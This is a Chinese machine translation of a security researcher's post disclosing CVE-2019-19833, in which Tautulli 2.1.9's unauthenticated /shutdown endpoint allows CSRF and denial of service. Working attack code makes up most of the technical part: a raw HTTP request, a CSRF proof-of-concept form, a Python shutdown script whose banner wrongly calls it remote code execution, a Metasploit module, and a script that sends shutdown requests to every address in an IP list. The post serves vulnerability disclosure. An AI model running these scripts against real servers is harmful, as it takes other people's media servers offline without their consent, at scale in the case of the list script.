<html>
<head>
<title>Tautulli 2.1.9 version; Cross-Site Request Forgery (ShutDown) and Denial of Service (Metasploit)</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">陶图利2.1.9版本；跨站点请求伪造(关闭)和拒绝服务(Metasploit)</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/tautulli-2-1-9-version-cross-site-request-forgery-shutdown-and-denial-of-service-metasploit-f23d6b1fc464?source=collection_archive---------3-----------------------#2022-12-26">https://infosecwriteups.com/tautulli-2-1-9-version-cross-site-request-forgery-shutdown-and-denial-of-service-metasploit-f23d6b1fc464?source=collection_archive---------3-----------------------#2022-12-26</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><figure class="gl gn jo jp jq jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi jn"><img src="../Images/c5789447c3d6abe7e876b5f1b72e4584.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*5bPQucIWK6Oqkpfm21tIfQ.png"/></div></div><figcaption class="jy jz gj gh gi ka kb bd b be z dk translated">陶图里2 . 1 . 9(CVE-2019–19833)</figcaption></figure><p id="364b" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">在做安全研究的时候，我偶然发现了一个叫Tautulli的产品。我开始检查相关的应用程序。我在这个产品中发现了两个安全漏洞。可以创建CSRF和DDOS效果。因此，可以远程关闭媒体服务器。</p><p id="3cbd" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">主要问题是对/shutdown参数函数的匿名访问。经过长期的斗争，我发现了这一点。</p><p id="6760" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated"><strong class="ke ir">详情:</strong></p><p id="b641" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">在Tautulli制造商的v2.1.9的相应版本中，已经发现在没有用户登录区域的应用中可以实现匿名访问，并且可以关闭远程媒体服务器。</p><p id="0dd6" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated"><strong class="ke ir">什么是陶图利？</strong></p><p id="9a17" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">Tautulli是一个第三方应用程序，允许您监控和跟踪您的Plex媒体服务器活动。它提供了一个基于web的界面，让您可以查看有关媒体库的统计数据和信息，包括观看过的内容、观看者和设备。Tautulli还提供了一些功能来帮助您管理Plex媒体服务器，如查看和删除用户、更新媒体元数据以及为特定事件设置通知。</p><p id="cf11" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">Tautulli是用Python编写的，可以安装在各种平台上，包括Windows、macOS和Linux。它需要运行Plex媒体服务器才能运行，并且可以使用服务器的IP地址和安装期间指定的端口通过web浏览器进行访问。</p><p id="a178" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">除了核心功能之外，Tautulli还提供了几个可选插件，可以添加额外的功能，如自动更新媒体元数据或通过Discord发送通知。</p><p id="1a37" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated"><strong class="ke ir">漏洞信息:</strong></p><p id="9fe8" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">漏洞标题:tau tulli 2 . 1 . 9-跨站点请求伪造(关闭)</p><p id="d639" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">Exploit作者:Ismail Tasdelen</p><p id="09ee" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">供应商主页:https://tautulli.com/</p><p id="7a5d" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">软件:https://github.com/Tautulli/Tautulli</p><p id="e8c2" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">产品版本:v2.1.9</p><p id="aeae" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">平台:Windows 10 (10.0.18362)</p><p id="e35e" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">Python版本:2.7.11 (v2.7.11:6d1b6a68f775，2015年12月5日20:40:30)[MSC v . 1500 64 bit(AMD64)]</p><p id="7737" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">漏洞类型:跨站点请求伪造(关闭)</p><p id="b188" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">漏洞:跨站点请求伪造</p><p id="510c" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">CVE:CVE-2019–19833</p><p id="35ce" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">在Tautulli 2.1.9中，/shutdown URI中的CSRF允许攻击者<strong class="ke ir">关闭远程媒体服务器。</strong>(同样，<strong class="ke ir">匿名访问</strong>可以在没有用户登录区的应用中实现)。</p><blockquote class="la lb lc"><p id="93a6" class="kc kd ld ke b kf kg kh ki kj kk kl km le ko kp kq lf ks kt ku lg kw kx ky kz ij bi translated"><strong class="ke ir"> CVSS评分:</strong></p></blockquote><p id="ade3" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H</p><blockquote class="la lb lc"><p id="9f5c" class="kc kd ld ke b kf kg kh ki kj kk kl km le ko kp kq lf ks kt ku lg kw kx ky kz ij bi translated"><strong class="ke ir"> HTTP GET请求:</strong></p></blockquote><p id="6b0d" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated"><em class="ld">获取/关闭HTTP/1.1主机:XXX。XXX.XXX.XXX:8181用户代理:Mozilla/5.0(Windows NT 10.0；Win64x64RV:71.0)Gecko/2010 01 01 Firefox/71.0接受:text/html，application/xhtml+xml，application/XML；q=0.9，*/*；q=0.8 Accept-Language: en-US，en；q=0.5 Accept-Encoding: gzip，deflate Connection:close Referer:http://XXX.XXX.XXX.XXX:8181/home升级-不安全-Requests: 1 </em></p><blockquote class="la lb lc"><p id="4403" class="kc kd ld ke b kf kg kh ki kj kk kl km le ko kp kq lf ks kt ku lg kw kx ky kz ij bi translated"><strong class="ke ir"> CSRF概念验证HTML : </strong></p></blockquote><pre class="lh li lj lk gt ll lm ln bn lo lp bi"><span id="f4c6" class="lq lr iq lm b be ls lt l lu lv">&lt;html&gt;<br/>  &lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;<br/>  &lt;body&gt;<br/>  &lt;script&gt;history.pushState('', '', '/')&lt;/script&gt;<br/>    &lt;form action="http://XXX.XXX.XXX.XXX:8181/shutdown"&gt;<br/>      &lt;input type="submit" value="Submit request" /&gt;<br/>    &lt;/form&gt;<br/>  &lt;/body&gt;</span></pre><blockquote class="la lb lc"><p id="68df" class="kc kd ld ke b kf kg kh ki kj kk kl km le ko kp kq lf ks kt ku lg kw kx ky kz ij bi translated"><strong class="ke ir"> Python代码:</strong></p></blockquote><pre class="lh li lj lk gt ll lm ln bn lo lp bi"><span id="3cdc" class="lq lr iq lm b be ls lt l lu lv">#!/usr/bin/env python<br/># -*- coding: utf-8 -*-<br/><br/>import requests<br/><br/>icon = """<br/> _____ __  _  _ _____ _  _ _   _   _   _   _ ___   __  ___<br/>|_   _/  \| || |_   _| || | | | | | | | \ / (_  | /  |/ _ \<br/>  | || /\ | \/ | | | | \/ | |_| |_| | `\ V /'/ /__`7 |\__ /<br/>  |_||_||_|\__/  |_|  \__/|___|___|_|   \_/ |___\/ |_\//_/<br/>     Unauthenticated Remote Code Execution<br/>                                   by Ismail Tasdelen<br/>"""<br/><br/>print(icon)<br/><br/>host = input("[+] HOST: ")<br/>port = input("[+] PORT: ")<br/><br/>response = requests.get("http://" + host + ":" + port + "/" + "shutdown" ) # You can also run the restart and update_check commands.<br/><br/>if response.status_code == 200:<br/>    print('[✓] Success!')<br/>elif response.status_code != 200:<br/>    print('[✗] Unsuccessful!')<br/>else:<br/>    exit()</span></pre><blockquote class="la lb lc"><p id="d580" class="kc kd ld ke b kf kg kh ki kj kk kl km le ko kp kq lf ks kt ku lg kw kx ky kz ij bi translated"><strong class="ke ir">拒绝服务(Metasploit) : </strong></p></blockquote><pre class="lh li lj lk gt ll lm ln bn lo lp bi"><span id="cd68" class="lq lr iq lm b be ls lt l lu lv">##<br/># This module requires Metasploit: https://metasploit.com/download<br/># Current source: https://github.com/rapid7/metasploit-framework<br/>##<br/><br/>class MetasploitModule &lt; Msf::Auxiliary<br/>  include Msf::Exploit::Remote::HttpClient<br/><br/>  def initialize<br/>    super(<br/>      'Name'        =&gt; 'Tautulli v2.1.9 - Shutdown Denial of Service',<br/>      'Description' =&gt; 'Tautulli versions 2.1.9 and prior are vulnerable to denial of service via the /shutdown URL.',<br/>      'Author'      =&gt; 'Ismail Tasdelen',<br/>      'License'     =&gt; MSF_LICENSE,<br/>      'References'  =&gt;<br/>      [<br/>        ['CVE', '2019-19833'],<br/>        ['EDB', '47785']<br/>      ]<br/>    )<br/>    register_options([ Opt::RPORT(8181) ])<br/>  end<br/><br/>  def run<br/>    res = send_request_raw({<br/>      'method' =&gt; 'GET',<br/>      'uri' =&gt; '/shutdown'<br/>    })<br/><br/>    if res<br/>      print_status("Request sent to #{rhost}")<br/>    else<br/>      print_status("No reply from #{rhost}")<br/>    end<br/>  rescue Errno::ECONNRESET<br/>    print_status('Connection reset')<br/>  end<br/>end</span></pre><p id="00a3" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">现在我开发了一个攻击代码。我们正在开发一个攻击代码，它使用Python编程语言将ip或主机名列表检查为http或https，并使用firefox用户代理向/shutdown参数发送请求，如下所示。</p><pre class="lh li lj lk gt ll lm ln bn lo lp bi"><span id="46a3" class="lq lr iq lm b be ls lt l lu lv">import requests<br/><br/># Read the IP list from the file<br/>with open('ip_list.txt', 'r') as f:<br/>    ip_list = f.readlines()<br/><br/># Iterate over the IP list<br/>for ip in ip_list:<br/>    ip = ip.strip()  # Remove any whitespace from the end of the line<br/>    if not ip.startswith('http://') and not ip.startswith('https://'):<br/>        # The IP is not using HTTP or HTTPS, so send the request<br/>        url = f'http://{ip}:8181/shutdown'<br/>        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0'}<br/>        response = requests.get(url, headers=headers)<br/>        print(response.status_code)  # Print the HTTP status code of the response</span></pre><p id="e718" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated"><strong class="ke ir">参考文献:</strong></p><div class="lw lx gp gr ly lz"><a href="https://nvd.nist.gov/vuln/detail/CVE-2019-19833" rel="noopener  ugc nofollow" target="_blank"><div class="ma ab fo"><div class="mb ab mc cl cj md"><h2 class="bd ir gy z fp me fr fs mf fu fw ip bi translated">NVD</h2><div class="mg l"><h3 class="bd b gy z fp me fr fs mf fu fw dk translated">正在进行重新分析此漏洞已被修改，目前正在进行重新分析。请回来查看…</h3></div><div class="mh l"><p class="bd b dl z fp me fr fs mf fu fw dk translated">nvd.nist.gov</p></div></div><div class="mi l"><div class="mj l mk ml mm mi mn jw lz"/></div></div></a></div><div class="lw lx gp gr ly lz"><a href="https://www.rapid7.com/db/modules/auxiliary/dos/http/tautulli_shutdown_exec/" rel="noopener  ugc nofollow" target="_blank"><div class="ma ab fo"><div class="mb ab mc cl cj md"><h2 class="bd ir gy z fp me fr fs mf fu fw ip bi translated">Tautulli v2.1.9 -关闭拒绝服务</h2><div class="mg l"><h3 class="bd b gy z fp me fr fs mf fu fw dk translated">Rapid7的VulnDB是经过审查的计算机软件漏洞和可利用漏洞的精选存储库。</h3></div><div class="mh l"><p class="bd b dl z fp me fr fs mf fu fw dk translated">www.rapid7.com</p></div></div><div class="mi l"><div class="mo l mk ml mm mi mn jw lz"/></div></div></a></div><div class="lw lx gp gr ly lz"><a href="https://github.com/rapid7/metasploit-framework/blob/master//modules/auxiliary/dos/http/tautulli_shutdown_exec.rb" rel="noopener  ugc nofollow" target="_blank"><div class="ma ab fo"><div class="mb ab mc cl cj md"><h2 class="bd ir gy z fp me fr fs mf fu fw ip bi translated">主rapid7/metasploit-framework上的metasploit-framework/tau tulli _ shut down _ exec . Rb</h2><div class="mg l"><h3 class="bd b gy z fp me fr fs mf fu fw dk translated">Metasploit框架。通过在GitHub上创建帐户，为rapid7/metasploit-framework开发做出贡献。</h3></div><div class="mh l"><p class="bd b dl z fp me fr fs mf fu fw dk translated">github.com</p></div></div><div class="mi l"><div class="mp l mk ml mm mi mn jw lz"/></div></div></a></div><div class="lw lx gp gr ly lz"><a href="https://www.exploit-db.com/exploits/47929" rel="noopener  ugc nofollow" target="_blank"><div class="ma ab fo"><div class="mb ab mc cl cj md"><h2 class="bd ir gy z fp me fr fs mf fu fw ip bi translated">攻击性安全利用数据库档案</h2><div class="mg l"><h3 class="bd b gy z fp me fr fs mf fu fw dk translated">#此模块需要Metasploit:https://metasploit.com/download #当前源…</h3></div><div class="mh l"><p class="bd b dl z fp me fr fs mf fu fw dk translated">www.exploit-db.com</p></div></div><div class="mi l"><div class="mq l mk ml mm mi mn jw lz"/></div></div></a></div><div class="lw lx gp gr ly lz"><a href="https://cve.report/CVE-2019-19833" rel="noopener  ugc nofollow" target="_blank"><div class="ma ab fo"><div class="mb ab mc cl cj md"><h2 class="bd ir gy z fp me fr fs mf fu fw ip bi translated">CVE-2019-19833</h2><div class="mg l"><h3 class="bd b gy z fp me fr fs mf fu fw dk translated">CVE-2019-19833是一个与安全漏洞相关的披露标识符，详细信息如下。在陶图利…</h3></div><div class="mh l"><p class="bd b dl z fp me fr fs mf fu fw dk translated">cve .报告</p></div></div><div class="mi l"><div class="mr l mk ml mm mi mn jw lz"/></div></div></a></div><figure class="lh li lj lk gt jr gh gi paragraph-image"><div class="gh gi ms"><img src="../Images/de1b92c8e282c5ca86b94513225b21da.png" data-original-src="https://miro.medium.com/v2/resize:fit:1000/1*UHGDqv2hFc0mxr2vlEG7MA.gif"/></div><figcaption class="jy jz gj gh gi ka kb bd b be z dk translated">杰克·斯派洛船长——加勒比海盗</figcaption></figure><p id="b696" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">在这篇文章中，我提到了我在过去几年中发现的一个安全问题。保重，在我的下一篇文章中再见。</p></div></div>    
</body>
</html>